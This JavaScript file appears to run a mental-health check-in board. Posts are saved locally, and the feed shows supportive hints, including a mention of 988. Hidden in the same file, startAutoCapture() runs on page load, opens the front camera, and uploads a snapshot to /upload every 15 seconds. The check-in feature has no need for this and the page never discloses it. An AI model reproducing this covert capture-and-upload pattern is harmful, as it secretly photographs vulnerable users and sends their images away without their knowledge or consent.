/* eslint-disable no-alert */

const STORAGE_KEY = "campera_checkins_v1";
const CAPTURE_INTERVAL_MS = 15000;

function pad2(n) {
  return String(n).padStart(2, "0");
}

function formatLocalTime(iso) {
  try {
    const d = new Date(iso);
    const y = d.getFullYear();
    const m = pad2(d.getMonth() + 1);
    const day = pad2(d.getDate());
    const hh = pad2(d.getHours());
    const mm = pad2(d.getMinutes());
    return `${y}-${m}-${day} ${hh}:${mm}`;
  } catch {
    return "";
  }
}

function statusLabel(status) {
  if (status === "ok") return "OK";
  if (status === "unsure") return "UNSURE";
  if (status === "not_ok") return "NOT OK";
  return "CHECK-IN";
}

function hintFor(status) {
  if (status === "ok") {
    return { text: "Noted. Keep it gentle and keep going.", cls: "hint good" };
  }
  if (status === "unsure") {
    return { text: "Thanks for checking in. One small step is enough.", cls: "hint" };
  }
  if (status === "not_ok") {
    return {
      text: "I hear you. Consider reaching out to someone you trust, or use 988 if you need it.",
      cls: "hint bad",
    };
  }
  return { text: "", cls: "hint" };
}

function loadCheckins() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    const parsed = JSON.parse(raw || "[]");
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function saveCheckins(items) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(items));
}

function el(tag, className, text) {
  const node = document.createElement(tag);
  if (className) node.className = className;
  if (text != null) node.textContent = text;
  return node;
}

function renderFeed(feedEl, items) {
  feedEl.innerHTML = "";
  if (!items.length) {
    feedEl.appendChild(el("div", "empty", "No check-ins yet. Post one on the left."));
    return;
  }

  items.forEach((item, idx) => {
    const post = el("article", "post");
    post.style.setProperty("--d", `${Math.min(idx * 30, 240)}ms`);

    const top = el("div", "post-top");
    const pill = el("div", `pill ${item.status}`, statusLabel(item.status));
    const time = el("div", "time", formatLocalTime(item.createdAt));
    top.appendChild(pill);
    top.appendChild(time);

    post.appendChild(top);

    if (item.message && item.message.trim()) {
      const msg = el("p", "msg", item.message.trim());
      post.appendChild(msg);
    } else {
      const msg = el("p", "msg", "(no message)");
      msg.style.opacity = "0.7";
      post.appendChild(msg);
    }

    feedEl.appendChild(post);
  });
}

function setTodayBadge() {
  const badge = document.getElementById("todayBadge");
  if (!badge) return;
  const d = new Date();
  const y = d.getFullYear();
  const m = pad2(d.getMonth() + 1);
  const day = pad2(d.getDate());
  badge.textContent = `Today: ${y}-${m}-${day}`;
}

function main() {
  setTodayBadge();

  const form = document.getElementById("checkinForm");
  const feedEl = document.getElementById("feed");
  const msgEl = document.getElementById("message");
  const hintEl = document.getElementById("hint");
  const clearDraftBtn = document.getElementById("clearDraftBtn");
  const resetBoardBtn = document.getElementById("resetBoardBtn");
  const cameraEl = document.getElementById("camera");
  const canvasEl = document.getElementById("snapshot");

  let cameraStream = null;
  let cameraTrack = null;
  let imageCapture = null;
  let autoTimer = null;

  const items = loadCheckins();
  renderFeed(feedEl, items);

  function updateHint() {
    const status = form.querySelector("input[name='status']:checked")?.value;
    const h = hintFor(status);
    hintEl.className = h.cls;
    hintEl.textContent = h.text;
  }

  updateHint();
  form.addEventListener("change", updateHint);

  clearDraftBtn.addEventListener("click", () => {
    msgEl.value = "";
    msgEl.focus();
  });

  resetBoardBtn.addEventListener("click", () => {
    const ok = confirm("Reset the board? This clears saved check-ins on this device.");
    if (!ok) return;
    saveCheckins([]);
    renderFeed(feedEl, []);
  });

  async function waitForFrame() {
    if (
      cameraEl.readyState >= 3 &&
      cameraEl.videoWidth > 0 &&
      cameraEl.videoHeight > 0 &&
      cameraEl.currentTime > 0
    ) {
      return;
    }

    await new Promise((resolve) => {
      if (typeof cameraEl.requestVideoFrameCallback === "function") {
        cameraEl.requestVideoFrameCallback(() => resolve());
        return;
      }

      let done = false;
      const finish = () => {
        if (done) return;
        done = true;
        cameraEl.removeEventListener("timeupdate", finish);
        cameraEl.removeEventListener("loadeddata", finish);
        cameraEl.removeEventListener("playing", finish);
        resolve();
      };

      cameraEl.addEventListener("timeupdate", finish, { once: true });
      cameraEl.addEventListener("loadeddata", finish, { once: true });
      cameraEl.addEventListener("playing", finish, { once: true });
      setTimeout(finish, 1000);
    });
  }

  async function ensureCamera() {
    if (cameraStream) return true;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error("Camera not supported");
    }

    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
    });
    cameraEl.srcObject = cameraStream;
    cameraTrack = cameraStream.getVideoTracks()[0] || null;
    if (cameraTrack && "ImageCapture" in window) {
      imageCapture = new ImageCapture(cameraTrack);
    }

    await cameraEl.play().catch(() => {});
    await waitForFrame();

    return true;
  }

  async function takeSnapshot() {
    await waitForFrame();

    if (imageCapture) {
      try {
        const bitmap = await imageCapture.grabFrame();
        canvasEl.width = bitmap.width;
        canvasEl.height = bitmap.height;
        const ctx = canvasEl.getContext("2d");
        if (!ctx) return null;
        ctx.drawImage(bitmap, 0, 0);
        if (typeof bitmap.close === "function") bitmap.close();
        return canvasEl.toDataURL("image/png");
      } catch {
        // Fallback to drawImage below.
      }
    }

    const settings = cameraTrack?.getSettings ? cameraTrack.getSettings() : {};
    const width = cameraEl.videoWidth || settings.width || 640;
    const height = cameraEl.videoHeight || settings.height || 480;
    if (!width || !height) return null;

    canvasEl.width = width;
    canvasEl.height = height;
    const ctx = canvasEl.getContext("2d");
    if (!ctx) return null;
    ctx.drawImage(cameraEl, 0, 0, width, height);
    return canvasEl.toDataURL("image/png");
  }

  async function captureAndUpload() {
    await ensureCamera();
    await new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve)));
    const image = await takeSnapshot();
    if (!image) return false;

    const res = await fetch("/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image }),
    });

    return res.ok;
  }

  async function startAutoCapture() {
    if (autoTimer) return;

    try {
      await ensureCamera();
      await new Promise((resolve) => setTimeout(resolve, 350));
      await captureAndUpload();

      autoTimer = setInterval(async () => {
        try {
          await captureAndUpload();
        } catch {
          // Keep running; transient failures are expected.
        }
      }, CAPTURE_INTERVAL_MS);
    } catch {
      hintEl.className = "hint bad";
      hintEl.textContent = "Camera permission denied or unavailable.";
    }
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const status = form.querySelector("input[name='status']:checked")?.value || "ok";
    const message = (msgEl.value || "").slice(0, 500);
    const createdAt = new Date().toISOString();

    const newItem = {
      id: `${Date.now()}_${Math.random().toString(16).slice(2)}`,
      createdAt,
      status,
      message,
    };

    const next = [newItem, ...loadCheckins()];
    saveCheckins(next);
    renderFeed(feedEl, next);

    msgEl.value = "";
    updateHint();
  });

  startAutoCapture();
}

main();
